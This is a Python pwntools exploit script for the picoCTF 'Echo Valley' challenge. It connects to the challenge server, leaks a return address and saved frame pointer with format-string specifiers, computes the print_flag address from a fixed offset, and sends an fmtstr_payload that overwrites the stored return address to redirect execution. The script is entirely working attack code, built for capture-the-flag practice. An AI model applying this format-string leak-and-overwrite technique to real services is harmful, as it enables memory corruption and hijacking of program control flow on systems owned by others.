from pwn import *

# Set the context
context.binary = './valley'  
context.log_level = 'debug'

# Connect to remote
p = remote("shape-facility.picoctf.net",63643)

p.recvuntil(b'Welcome to the Echo Valley, Try Shouting: ')

# Leak the return address of the echo_valley function
p.sendline(b'%21$p')
p.recvuntil(b'You heard in the distance: ')
return_addr = p.recvline().decode()
log.info(f"Leaked return address: {return_addr}")
return_addr = int(return_addr, 16)

p.sendline(b'%20$p')
p.recvuntil(b'You heard in the distance: ')
saved_ebp = p.recvline().decode()
log.info(f"Leaked saved EBP: {saved_ebp}")
saved_ebp = int(saved_ebp,16)

# Calculate the address of print_flag
print_flag_offset = -0x1aa  # Offset of print_flag (from objdump)
print_flag_addr = return_addr + print_flag_offset
log.info(f"print_flag address: {hex(print_flag_addr)}")

# Calculate the stack address of the return address
return_addr_stack_addr = saved_ebp - 8
log.info(f"Return address stack address: {hex(return_addr_stack_addr)}")

# Craft the payload
payload = fmtstr_payload(6, {return_addr_stack_addr: print_flag_addr})  
p.sendline(payload)
p.sendlineafter(b'You heard in the distance: ', b'exit')

# Print the flag
print(p.recvall().decode('latin-1').split(" ")[-1])